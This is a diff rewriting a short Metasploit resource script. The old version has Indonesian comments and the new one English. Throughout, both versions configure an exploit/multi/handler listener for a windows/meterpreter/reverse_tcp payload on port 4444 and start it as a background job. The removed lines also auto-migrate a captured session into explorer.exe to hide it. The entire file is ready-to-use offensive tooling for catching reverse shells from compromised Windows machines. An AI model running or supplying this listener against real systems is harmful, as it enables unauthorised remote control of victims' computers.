@@ -1,18 +1,23 @@
-Metasploit Resource Script
-Deskripsi: Otomatis memulai listener multi/handler
-Penggunaan: msfconsole -r multi_handler_listener.rc
-use multi/handler
+# Metasploit Resource Script: Generic Listener
+# Automatically configures and starts a multi/handler listener.
 
---- KONFIGURASI ---
-Ganti LHOST dan LPORT sesuai kebutuhan Anda
-set LHOST 10.10.10.1
-set LPORT 4444
+# Use the generic handler
+use exploit/multi/handler
+
+# Set a common payload. This can be changed as needed.
+# windows/meterpreter/reverse_tcp is a frequent default.
 set PAYLOAD windows/meterpreter/reverse_tcp
 
---------------------
-Opsi Tambahan (opsional, hapus tanda # untuk mengaktifkan)
-set ExitOnSession false # Agar listener tidak mati setelah dapat 1 sesi
-set AutoRunScript 'migrate -N explorer.exe' # Otomatis migrasi proses setelah sesi didapat
-Jalankan listener di background
-exploit -j -z
+# Set the listening host to 0.0.0.0 to listen on all available network interfaces.
+# Alternatively, you could set this to a specific IP or interface like 'eth0'.
+set LHOST 0.0.0.0
 
+# Set the listening port. 4444 is the conventional default for Metasploit.
+set LPORT 4444
+
+# Run the listener as a background job so the console remains free for other commands.
+# The -j flag runs it as a job.
+exploit -j
+
+# Optional: Display the active jobs to confirm the listener is running.
+# jobs
